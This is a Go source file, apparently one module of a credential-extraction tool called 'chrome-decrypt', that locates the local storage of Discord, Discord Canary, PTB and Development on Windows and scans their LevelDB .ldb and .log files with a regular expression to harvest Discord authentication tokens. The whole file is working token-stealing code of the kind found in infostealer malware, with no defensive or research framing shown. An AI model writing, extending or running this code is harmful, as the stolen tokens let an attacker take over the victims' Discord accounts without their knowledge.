package discord

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"chrome-decrypt/pkg/credentials"
)

// Extractor implements the credentials.Extractor interface
type Extractor struct {
	verbose bool
}

// NewExtractor creates a new Discord extractor
func NewExtractor(verbose bool) *Extractor {
	return &Extractor{verbose: verbose}
}

// Extract extracts Discord authentication tokens
func (e *Extractor) Extract() (interface{}, error) {
	if e.verbose {
		fmt.Println("[*] Extracting Discord tokens...")
	}

	var creds []credentials.AppCredential

	// Discord stores tokens in Local Storage and IndexedDB
	localAppData := os.Getenv("LOCALAPPDATA")

	discordPaths := []struct {
		path string
		name string
	}{
		{filepath.Join(localAppData, "Discord"), "Discord"},
		{filepath.Join(localAppData, "DiscordCanary"), "Discord Canary"},
		{filepath.Join(localAppData, "DiscordPTB"), "Discord PTB"},
		{filepath.Join(localAppData, "DiscordDevelopment"), "Discord Development"},
	}

	for _, discordPath := range discordPaths {
		if _, err := os.Stat(discordPath.path); os.IsNotExist(err) {
			continue
		}

		// Look for Local Storage files
		localStoragePath := filepath.Join(discordPath.path, "Local Storage", "leveldb")
		if tokens := e.extractDiscordFromLevelDB(localStoragePath); len(tokens) > 0 {
			for _, token := range tokens {
				creds = append(creds, credentials.AppCredential{
					Application: discordPath.name,
					Token:       token,
				})
			}
		}
	}

	if e.verbose {
		fmt.Printf("[+] Found %d Discord token entries\n", len(creds))
	}
	return creds, nil
}

// GetType returns the extractor type
func (e *Extractor) GetType() string {
	return "discord_tokens"
}

// extractDiscordFromLevelDB extracts Discord tokens from LevelDB files
func (e *Extractor) extractDiscordFromLevelDB(dbPath string) []string {
	var tokens []string

	if _, err := os.Stat(dbPath); os.IsNotExist(err) {
		return tokens
	}

	files, err := os.ReadDir(dbPath)
	if err != nil {
		return tokens
	}

	// Discord tokens follow specific patterns
	tokenRegex := regexp.MustCompile(`[a-zA-Z0-9_-]{23,28}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27}`)

	for _, file := range files {
		if strings.HasSuffix(file.Name(), ".ldb") || strings.HasSuffix(file.Name(), ".log") {
			filePath := filepath.Join(dbPath, file.Name())
			content, err := os.ReadFile(filePath)
			if err != nil {
				continue
			}

			matches := tokenRegex.FindAll(content, -1)
			for _, match := range matches {
				token := string(match)
				// Avoid duplicates
				if !e.contains(tokens, token) {
					tokens = append(tokens, token)
				}
			}
		}
	}

	return tokens
}

// contains checks if a slice contains a string
func (e *Extractor) contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}
